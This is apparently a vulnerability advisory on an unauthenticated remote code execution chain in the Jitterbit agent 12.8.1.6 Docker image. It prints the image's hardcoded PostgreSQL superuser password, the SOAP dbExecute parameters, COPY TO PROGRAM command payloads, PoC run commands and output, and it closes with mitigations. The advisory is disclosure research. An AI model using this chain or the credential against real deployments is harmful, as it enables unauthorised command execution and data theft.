# Jitterbit Agent 12.8.1.6 — Unauthenticated SOAP JdbcEngine.dbExecute + Hardcoded PostgreSQL Superuser → COPY TO PROGRAM RCE

## 1. Overview

Jitterbit Harmony is an enterprise iPaaS (integration platform as a service). Its private-deployment integration agent ships as the public Docker image `jitterbit/agent:12.8.1.6` and bundles an Apache HTTP proxy, a Tomcat / Apache Axis SOAP stack, and a local PostgreSQL 16.13 database. The SOAP interface on ports 46908 (Apache proxy) and 46912 (Tomcat direct) is the agent's core management plane — and it carries no authentication by default. Of the 12 anonymously reachable SOAP services, `JdbcEngine.dbExecute` accepts a fully attacker-controlled connection-parameter set plus arbitrary SQL, while the image itself bakes in the local PostgreSQL superuser password.

The resulting chain — unauthenticated `startNewSession`, then `dbExecute` instructing the agent to connect to its own local PostgreSQL as the baked-in superuser, then `COPY ... TO PROGRAM` — executes arbitrary OS commands inside the agent container as `jitterbit` (uid=999), with command output read back remotely through SOAP alone. Dynamic verification confirmed execution via both network paths.

This advisory documents the full research process: port-level surface discovery → authentication-boundary audit → sink localization by decompilation → source-to-sink data-flow tracing → exploit-chain construction → dynamic verification with adversarial cross-checks.

## 2. Vulnerability Summary

- **Type**: Unauthenticated remote code execution via missing SOAP authentication + hardcoded database-superuser credentials + privileged SQL dispatch
- **Root cause 1 (CWE-306, Missing Authentication for Critical Function)**: the Axis SOAP layer enforces no authentication — both `web.xml` files declare zero `security-constraint` elements and zero filters; the Apache `<Location /axis>` block defines no `AuthType`/`Require`
- **Root cause 2 (CWE-798, Use of Hard-coded Credentials)**: the local PostgreSQL superuser password is generated at image build time and baked into the public Docker image (`jitterbit.conf` + PG data directory), so every deployment pulled from Docker Hub shares the same publicly retrievable password
- **Root cause 3 (CWE-78 / CWE-94, OS Command Injection / Code Injection)**: `JdbcEngine.dbExecute` dispatches fully attacker-controlled `ConnectionParams` and arbitrary SQL; connected to the embedded PG as superuser, `COPY (SELECT 1) TO PROGRAM '<cmd>'` executes an OS command in a shell on the database host (the agent container itself)
- **Privilege context (CWE-250, Execution with Unnecessary Privileges)**: the PG role `jitterbit` is a superuser (`rolsuper=t`); commands run as the PostgreSQL service identity `jitterbit` (uid=999)
- **Result**: unauthenticated remote command execution as `jitterbit` (uid=999) in the agent container
- **CVSS**: 9.8 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## 3. Attack Surface & Authentication Boundary

The agent container (started as root; services run as the downgraded user `jitterbit`, uid=999) exposes these listening ports:

| Port | Service | Binding |
|------|---------|---------|
| 3000 | health check | 127.0.0.1 |
| 46908 | Apache HTTP proxy — primary SOAP entry (`/soap-services/*`) | 0.0.0.0, declared in image `ExposedPorts` |
| 46909 | Apache SSL | — |
| 46912 | Tomcat Axis direct (`/axis/soap-services/*`) | 127.0.0.1 (direct-connect path also verified reachable from the test network) |
| 46914 | bundled PostgreSQL (data-directory port setting) | 127.0.0.1 |
| 6432 | PostgreSQL `[DbInfo]` port | 0.0.0.0 |

### 3.1 Why the SOAP plane is unauthenticated by default

Authentication-boundary audit of the default image:

- **Global Tomcat `web.xml`** (`/opt/jitterbit/tomcat/conf/web.xml`): 0 `security-constraint` elements
- **Axis webapp `web.xml`** (`/opt/jitterbit/tomcat/webapps/axis/WEB-INF/web.xml`): 0 `security-constraint` elements, 0 filters
- **Apache `<Location /axis>`** (`httpd-jitterbit.conf:32-34`): only `SetHandler axis` — no `AuthType`, no `Require`

All 12 SOAP services under `/axis/soap-services/*` (ScriptEngine, JdbcEngine, JdbcInfoProvider, FunctionEngine, ConnectorEngine, WsWebService, OperationEngine, UserEngine, JitterbitConnect, and others) are therefore anonymously reachable. Note that the agent process itself requires Jitterbit Harmony cloud-registration credentials to fully start, but Apache, Tomcat, and PostgreSQL start independently — the SOAP services are reachable without any cloud credentials.

### 3.2 Reachability

- **Exposure**: the image declares `46908/tcp` in `ExposedPorts`; publishing it (`-p 46908:46908`) is the expected deployment pattern because the SOAP plane is the interface the Harmony management plane calls. 46908 listens on 0.0.0.0.
- **Transport**: plain HTTP SOAP POST — no TLS, certificate, or domain dependency; no MITM required.
- **No pre-existing entities needed**: TranDb entity tables are empty on a fresh agent (`filestoretab`/`operationstab`/`pluginstab` = 0 rows); the exploit pivots through attacker-supplied connection parameters, not stored integration entities.

## 4. Root-Cause Analysis

Research proceeded by enumerating the 12 SOAP services for high-value sinks. Sink candidates: `ScriptEngine.RunScript` (Jitterbit script → Nashorn/legacy engine), `JdbcEngine.dbExecute`/`dbLookup`/`callStoredProcedure` (SQL execution with caller-supplied connection parameters), and `JdbcInfoProvider.testConnection`. `JdbcEngine.dbExecute` ranked highest: it accepts fully attacker-controlled connection parameters plus arbitrary SQL.

### 4.1 Unauthenticated SQL dispatch (decompiled `JdbcEngineImpl.java`, from `jitterbit-soap-services-1.0.0-SNAPSHOT.jar`)

```java
// JdbcEngineImpl.java:239 — dbExecute entry
public WsDbExecuteResult dbExecute(String sessionId, WsDbLookupParams params, int maxNumberOfRows) {
    org.jitterbit.integration.server.engine.jdbc.JdbcEngine engine =
        org.jitterbit.integration.server.engine.jdbc.JdbcEngine.getEngine();
    DbExecuteResult result = engine.dbExecute(
        new JdbcSessionId(sessionId),
        this.getSourceOrTargetId(params),                          // entityId (fake GUID accepted)
        JdbcEngineImpl.toConnectionParams(params.getConnectionParams()),  // attacker-controlled
        JdbcEngineUtils.getSqlStatement(params),                   // attacker-controlled SQL
        maxNumberOfRows, params.isAutoCommit(), params.isReturnRowSet());
    return this.convertToWsDbExecuteResult(result);
}

// JdbcEngineImpl.java:247 — GUID must be non-empty but is never checked for existence
private EntityId getSourceOrTargetId(WsDbLookupParams params) {
    if (!Strings.isNullOrEmpty((String)params.getSourceGuid())) {
        return new SourceId(params.getSourceGuid());   // new SourceId(guid), no DB lookup
    }
    if (!Strings.isNullOrEmpty((String)params.getTargetGuid())) {
        return new TargetId(params.getTargetGuid());
    }
    throw new IllegalArgumentException("Must specify a Source or Target GUID.");
}

// JdbcEngineImpl.toConnectionParams — direct conversion, no filtering
private static ConnectionParams toConnectionParams(WsConnectionParams ws) {
    ConnectionParams params = new ConnectionParams();
    params.setDriverName(ws.getDriverName()).setServer(ws.getServer())
          .setDatabase(ws.getDatabase()).setPort(Port.valueOf((int)ws.getPort()))
          .setUser(ws.getUser()).setPassword(ws.getPassword())  // caller-supplied password passed through
          ...;
}
```

The full WSDL source object `WsDbLookupParams` carries `SourceGuid` / `TargetGuid` / `ConnectionParams` (Server, Port, Database, User, Password, DriverName, ManualConnectionString, AdditionalParams, Timeout, TransactionIsolationLevel) / `Sql` / `AutoCommit` / `ReturnRowSet` — the entire object, including connection settings and SQL text, is attacker-controlled.

### 4.2 Data flow: the connection is built from the request, the GUID is only a cache key

Tracing the sink: `engine.dbExecute` → `JdbcSession.getDbExecute` → `connectToExternalDB` → `SourceAndTargetConnections.getConnection(entityId, params)` → `createConnection(params)` → `DefaultConnectionFactory(params).newConnection()`. The connection is built entirely from `params`; `entityId` (derived from the fake GUID) serves only as a cache key. A fake GUID such as `00000000-0000-0000-0000-000000000000` passes the `Strings.isNullOrEmpty` check (it is a non-empty string), so the engine connects to whatever database the request specifies — here the agent's own local PostgreSQL, reachable from the agent process at `127.0.0.1`.

### 4.3 Hardcoded PostgreSQL superuser credentials baked into the public image (CWE-798)

Image-internal configuration evidence:

```ini
# /opt/jitterbit/jitterbit.conf — [DbInfo] section
[DbInfo]                           # line 66
User=jitterbit                     # line 67
Password='#)~MxgD*m2Q!vhvhXD1'     # line 68  <- hardcoded password
Server=127.0.0.1                   # line 71
Port=6432                          # line 72
```

```ini
# /opt/jitterbit/DataInterchange/pgsql/data/postgresql.conf
port = 46914                       # line 64  <- actual PG listen port
```

Proof from a fresh container that was never started:

```bash
$ docker run --rm --entrypoint sh jitterbit/agent:12.8.1.6 \
    -c "grep -n Password /opt/jitterbit/jitterbit.conf; grep -n ^port /opt/jitterbit/DataInterchange/pgsql/data/postgresql.conf"
68:Password='#)~MxgD*m2Q!vhvhXD1'
64:port = 46914
```

The image build pipeline runs the password-generation step (`openssl rand` in the `init_db` function of `/opt/jitterbit/bin/jitterbit`) at image build time, so the generated value is baked into the published image (`jitterbit.conf` and the PG data directory). Every deployment that pulls `jitterbit/agent:12.8.1.6` from Docker Hub therefore shares the same password — a publicly retrievable default credential. The PG role `jitterbit` is a superuser (`rolsuper=t`), which grants `COPY ... TO PROGRAM`.

### 4.4 COPY TO PROGRAM (CWE-78)

`COPY (SELECT 1) TO PROGRAM '<cmd>'` is a PostgreSQL superuser-privileged statement that runs `<cmd>` in a shell as the PostgreSQL service process. In this stack that process is `jitterbit` (uid=999) inside the agent container.

### 4.5 Research note — alternative sink excluded

`ScriptEngine.RunScript` was evaluated and excluded: the legacy script engine's file/DB/process functions (ReadFile/WriteFile/DbExecute/DbLookup/RunOperation/RunPlugin) all require pre-existing DB entity IDs, and TranDb entity tables are empty on a fresh agent — a dead end. Grep across all `.so` libraries for `RunCommand`/`RunProgram`/`System`/`Exec`/`Shell`/`RunProcess` returned zero hits; those names only appear echoed back in engine error messages (an early false lead, excluded).

## 5. Exploit Chain Construction

```
1. Unauthenticated SOAP startNewSession (no auth header)        -> sessionId
2. Unauthenticated SOAP dbExecute:
   - SourceGuid = 00000000-0000-0000-0000-000000000000  (fake; passes isNullOrEmpty, no existence check)
   - ConnectionParams = {Server=127.0.0.1, Port=46914, Database=TranDb,
                         User=jitterbit, Password=#)~MxgD*m2Q!vhvhXD1, DriverName=PostgreSQL}
   - Sql = COPY (SELECT 1) TO PROGRAM 'id > /tmp/marker 2>&1; echo POCOK >> /tmp/marker'
   -> engine connects to the local PG superuser and executes COPY TO PROGRAM -> OS command (uid=999)
3. (Output capture) second dbExecute: COPY <table> FROM PROGRAM 'cat /tmp/marker'
4. (Remote readback) third dbExecute: SELECT line FROM <table> -> command output in the SOAP response
```

Two properties make the chain fully remote: the SQL connection is opened by the agent process itself (so `Server=127.0.0.1` resolves to the agent container's own PostgreSQL — the attacker never needs direct network access to port 46914/6432), and the output-readback steps mean no SSH/console access is needed to observe results.

## 6. PoC Usage

The PoC (`exploit/jitterbit_jdbcengine_rce.py`, pure Python 3 standard library — urllib / base64 / regex / ssl) drives all four steps automatically and prints the command output read back over SOAP.

```bash
# 1. Deploy (cloud registration credentials are NOT required for the SOAP/PG attack surface)
docker run -d --name jbtest -p 46908:46908 jitterbit/agent:12.8.1.6

# 2. Independently confirm the baked-in credential (fresh image, never started)
docker run --rm --entrypoint sh jitterbit/agent:12.8.1.6 \
    -c "grep -n Password /opt/jitterbit/jitterbit.conf"

# 3. Run the PoC — Apache proxy path (46908)
python3 exploit/jitterbit_jdbcengine_rce.py 127.0.0.1:46908 "id"

# 4. Run the PoC — Tomcat direct path (46912)
python3 exploit/jitterbit_jdbcengine_rce.py 127.0.0.1:46912 "id" --direct
```

The script generates a unique marker file (`/tmp/jb_rce_v_<timestamp>.txt`) and capture table (`jb_rce_vtab_<timestamp>`) per run, avoiding collision with earlier residue.

## 7. Verification Evidence

Dynamic verification was performed against `jitterbit/agent:12.8.1.6` from a dedicated research host on 2026-08-09. Both entry paths were tested: the Apache proxy on 46908 (`/soap-services/JdbcEngine`) and the Tomcat direct path on 46912 (`/axis/soap-services/JdbcEngine`).

### 7.1 Unauthenticated startNewSession (no auth headers sent)

```xml
<startNewSessionReturn>
  <Error><ErrorCode>0</ErrorCode>...</Error>
  <SessionId>2c5aeb89-87bb-440d-a74e-cdcf83e591ba</SessionId>
</startNewSessionResponse>
```

### 7.2 Proof that attacker SQL really executes (SELECT version())

SOAP response row (base64-decoded): `PostgreSQL 16.13 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4, 64-bit`

### 7.3 COPY TO PROGRAM execution — PoC run A (Apache 46908, cmd=`id`)

```
[*] Step 1: unauthenticated startNewSession
[+] startNewSession success (no auth): SessionId = 2c5aeb89-87bb-440d-a74e-cdcf83e591ba
[*] Step 2: dbExecute COPY TO PROGRAM (execute command, write marker)
    ErrorCode=0 UpdateCount=1
[+] Command executed, marker file: /tmp/jb_rce_v_1786226089.txt
[*] Step 3: dbExecute COPY FROM PROGRAM (capture output to PG table jb_rce_vtab_1786226089)
    ErrorCode=0 captured rows=2

[+] ===== Command output (read back remotely via SOAP) =====
uid=999(jitterbit) gid=999(jitterbit) groups=999(jitterbit)
POCOK
[+] ===== End of command output =====
```

The identical result was produced through the Tomcat direct path 46912 with a distinct session (`e57e102d-4cc7-4115-9edf-f8074428dfe8`) and marker `/tmp/jb_rce_v_1786226111.txt`.

### 7.4 Target-side marker verification (container side)

```bash
$ docker exec jbtest stat -c "owner=%U uid=%u" /tmp/jb_rce_v_1786226089.txt
owner=jitterbit uid=999
$ docker exec jbtest cat /tmp/jb_rce_v_1786226089.txt
uid=999(jitterbit) gid=999(jitterbit) groups=999(jitterbit)
POCOK
```

Marker files exist with `owner=jitterbit uid=999` and contain the `id` output plus `POCOK`, produced by commands run through both network paths with fresh, unique markers per run (no residue reuse).

### 7.5 Adversarial cross-checks

| Verification agent | Verdict | Confidence | Notes |
|--------------------|---------|------------|-------|
| Falsification agent (7 assertions) | NOT_REFUTED | 0.96 | all 7 assertions stood; end-to-end rerun on a fresh container |
| Independent re-analysis agent (15 questions from scratch) | CONFIRMED | 0.96 | independent dynamic verification on both paths with fresh markers; source-level confirmation |

## 8. Security Impact

- **Confidentiality**: arbitrary command execution as `jitterbit` (uid=999) in the agent container — full superuser read access to the embedded PostgreSQL (TranDb and the agent's operational store), the agent's local filesystem, and any secret material the integration runtime holds; the output-readback steps make exfiltration trivially remote
- **Integrity**: full control of the integration agent — database contents, configuration, and runtime behavior of the component that executes the customer's integration projects; the chain needs no credentials, no user interaction, and works against a default deployment
- **Availability**: the container/PG processes can be terminated or corrupted at will; a crashed or wiped agent halts all integrations the host serves
- **Scope note**: the container is started as root with services downgraded to uid=999; potential container-internal privilege-escalation paths exist but are not required — uid=999 already is full OS command execution

## 9. Mitigation

1. **Enforce authentication on the SOAP plane**: add `security-constraint` plus an authentication filter to the Axis `web.xml`; add `AuthType` + `Require valid-user` to the Apache `<Location /axis>` block
2. **Stop accepting caller-controlled connection parameters**: `dbExecute` should resolve connections only from server-side registered Source/Target configurations (looked up by GUID), not from request-supplied `ConnectionParams`; at minimum, whitelist permitted `ConnectionParams.Server` values
3. **Remove the hardcoded PG password**: generate the password at first container start (`openssl rand`) and initialize the database then, instead of baking it into the image; or require a deployment-mounted `/conf/jitterbit.conf` carrying a unique password
4. **Downgrade the PG role**: `jitterbit` should not be a superuser; use a low-privilege application role — `pg_execute_server_program` (PG 13+) gates `COPY TO PROGRAM`
5. **Network isolation**: do not expose 46908 publicly; restrict it to the management-plane network
